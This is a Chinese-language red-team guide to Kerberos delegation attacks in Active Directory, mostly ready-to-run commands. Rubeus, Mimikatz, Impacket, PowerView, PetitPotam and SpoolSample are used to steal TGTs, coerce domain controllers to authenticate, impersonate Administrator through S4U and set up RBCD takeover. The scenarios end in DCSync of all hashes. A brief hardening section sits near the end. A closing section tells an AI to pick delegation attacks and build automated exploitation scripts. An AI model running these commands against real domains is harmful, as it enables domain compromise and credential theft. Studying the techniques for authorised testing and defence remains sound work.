# 委派攻击

Kerberos 委派允许服务代表用户访问其他服务，配置不当可导致权限提升。

## 委派类型

### 非约束委派 (Unconstrained Delegation)

**原理**：
- 服务可以模拟任意用户
- 用户的 TGT 被缓存在服务器
- 服务可以使用 TGT 访问任何服务

**风险**：
- 最危险的委派类型
- 可以获取域管理员权限

### 约束委派 (Constrained Delegation)

**原理**：
- 限制可以访问的服务
- msDS-AllowedToDelegateTo 属性
- 使用 S4U2Self 和 S4U2Proxy

**类型**：
- 仅 Kerberos
- 协议转换（任意协议）

### 基于资源的约束委派 (RBCD)

**原理**：
- 资源控制谁可以委派
- msDS-AllowedToActOnBehalfOfOtherIdentity
- 更灵活的配置

## 非约束委派攻击

### 枚举

**PowerView**：
```powershell
# 计算机
Get-DomainComputer -Unconstrained

# 用户
Get-DomainUser -TrustedToAuth
```

**LDAP**：
```bash
ldapsearch -x -h dc.domain.com -b "dc=domain,dc=com" "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
```

**ADSearch**：
```
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes dnshostname
```

### 利用

**等待高权限用户连接**：
1. 获取非约束委派主机的访问权限
2. 监控 TGT 缓存
3. 导出高权限用户的 TGT

**Rubeus**：
```
# 监控新票据
Rubeus.exe monitor /interval:5 /filteruser:Administrator

# 导出票据
Rubeus.exe dump /luid:0x3e7 /service:krbtgt
```

**Mimikatz**：
```
# 导出所有票据
sekurlsa::tickets /export

# 注入票据
kerberos::ptt ticket.kirbi
```

### 强制认证

**打印机漏洞（PrinterBug）**：
```bash
# SpoolSample
SpoolSample.exe dc.domain.com unconstrained-server.domain.com

# Rubeus 监控
Rubeus.exe monitor /interval:1 /filteruser:DC$
```

**PetitPotam**：
```bash
PetitPotam.exe unconstrained-server.domain.com dc.domain.com
```

**Coercer**：
```bash
coercer -u user -p password -d domain.com -l unconstrained-server.domain.com -t dc.domain.com
```

## 约束委派攻击

### 枚举

**PowerView**：
```powershell
# 用户
Get-DomainUser -TrustedToAuth

# 计算机
Get-DomainComputer -TrustedToAuth
```

**LDAP**：
```bash
ldapsearch -x -h dc.domain.com -b "dc=domain,dc=com" "(&(objectClass=user)(msDS-AllowedToDelegateTo=*))" msDS-AllowedToDelegateTo
```

### S4U2Self 和 S4U2Proxy

**S4U2Self**：
- 服务为任意用户请求服务票据
- 票据可转发（Forwardable）

**S4U2Proxy**：
- 使用可转发票据请求其他服务票据
- 受 msDS-AllowedToDelegateTo 限制

### 利用（仅 Kerberos）

**Rubeus**：
```
# 获取 TGT
Rubeus.exe asktgt /user:service$ /rc4:hash /domain:domain.com

# S4U2Self + S4U2Proxy
Rubeus.exe s4u /ticket:TGT.kirbi /impersonateuser:Administrator /msdsspn:cifs/target.domain.com /ptt
```

**Impacket**：
```bash
getST.py -spn cifs/target.domain.com -impersonate Administrator domain.com/service$:password
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.com/Administrator@target.domain.com
```

### 利用（协议转换）

**允许任意协议**：
- TRUSTED_TO_AUTH_FOR_DELEGATION 标志
- 可以使用密码认证

**Rubeus**：
```
Rubeus.exe s4u /user:service$ /rc4:hash /impersonateuser:Administrator /msdsspn:cifs/target.domain.com /altservice:ldap /ptt
```

### 服务替换

**SPN 替换**：
- 请求一个服务的票据
- 修改为另一个服务
- 绕过 msDS-AllowedToDelegateTo 限制

**示例**：
```
# 请求 TIME 服务
Rubeus.exe s4u /user:service$ /rc4:hash /impersonateuser:Administrator /msdsspn:time/dc.domain.com /altservice:ldap /ptt

# 票据可用于 LDAP
```

## 基于资源的约束委派 (RBCD)

### 原理
- 资源对象控制委派权限
- msDS-AllowedToActOnBehalfOfOtherIdentity
- 需要对目标对象的 GenericWrite 或 GenericAll

### 枚举

**PowerView**：
```powershell
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl"}
```

**查看现有 RBCD**：
```powershell
Get-DomainComputer target | Select-Object -ExpandProperty msds-allowedtoactonbehalfofotheridentity
```

### 利用

**前提条件**：
1. 对目标计算机的 GenericWrite/GenericAll
2. 控制一个有 SPN 的账户（计算机或服务账户）

**步骤**：

1. **创建计算机账户**（如果需要）：
```powershell
# PowerMad
New-MachineAccount -MachineAccount attacker$ -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# Impacket
addcomputer.py -computer-name 'attacker$' -computer-pass 'Password123!' domain.com/user:password
```

2. **配置 RBCD**：
```powershell
# PowerView
$attacker = Get-DomainComputer attacker$
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($attacker.objectsid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer target | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Impacket
rbcd.py -delegate-from 'attacker$' -delegate-to 'target$' -action write domain.com/user:password
```

3. **执行 S4U 攻击**：
```
# Rubeus
Rubeus.exe s4u /user:attacker$ /rc4:hash /impersonateuser:Administrator /msdsspn:cifs/target.domain.com /ptt

# Impacket
getST.py -spn cifs/target.domain.com -impersonate Administrator domain.com/attacker$:Password123!
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.com/Administrator@target.domain.com
```

### 清理

**删除 RBCD 配置**：
```powershell
# PowerView
Get-DomainComputer target | Set-DomainObject -Clear msds-allowedtoactonbehalfofotheridentity

# Impacket
rbcd.py -delegate-from 'attacker$' -delegate-to 'target$' -action remove domain.com/user:password
```

## 高级技巧

### 跨域委派
- 林内信任
- 跨域 S4U 攻击

### 委派链
- 多级委派
- 从低权限到高权限

### 结合其他攻击
- RBCD + GenericWrite
- RBCD + 计算机账户配额
- 约束委派 + 密码重置

## 机器账户配额

### MAQ (MachineAccountQuota)

**默认值**：
- 10 个计算机账户
- 普通用户可创建

**查询**：
```powershell
Get-DomainObject -Identity "DC=domain,DC=com" -Properties ms-DS-MachineAccountQuota
```

**利用**：
- 创建计算机账户用于 RBCD
- 无需特殊权限

**绕过 MAQ=0**：
- 寻找已有的计算机账户
- 重置计算机账户密码（需要权限）
- 使用服务账户

## 防御检测

### 监控
- 非约束委派主机的票据活动
- msDS-AllowedToActOnBehalfOfOtherIdentity 修改
- 新计算机账户创建
- S4U 请求

### 加固
- 禁用非约束委派
- 限制约束委派范围
- 设置 MAQ=0
- 保护敏感账户（Account is sensitive and cannot be delegated）

### 敏感账户保护

**设置标志**：
```powershell
Set-ADUser -Identity Administrator -AccountNotDelegated $true
```

**检查**：
```powershell
Get-DomainUser -AllowDelegation -AdminCount
```

## 实战场景

### 场景 1：非约束委派提权
1. 发现非约束委派主机
2. 获取该主机访问权限
3. 强制域控认证
4. 捕获域控 TGT
5. DCSync 获取所有哈希

### 场景 2：RBCD 提权
1. 发现对目标主机的 GenericWrite
2. 创建计算机账户
3. 配置 RBCD
4. S4U 模拟管理员
5. 访问目标主机

### 场景 3：约束委派横向移动
1. 获取约束委派账户
2. S4U 模拟高权限用户
3. 访问允许的服务
4. 服务替换扩大访问范围

---

**AI 发挥空间**：
- 根据枚举结果选择合适的委派攻击方法
- 分析委派配置发现攻击路径
- 结合其他技术进行委派攻击
- 开发自动化委派枚举和利用脚本

**反幻觉提示**：
- 不要假设所有环境都有可利用的委派配置
- 验证目标的委派类型和限制
- 测试攻击方法的实际效果
- 注意委派攻击可能触发告警
- 某些攻击需要特定权限或条件（如 GenericWrite）
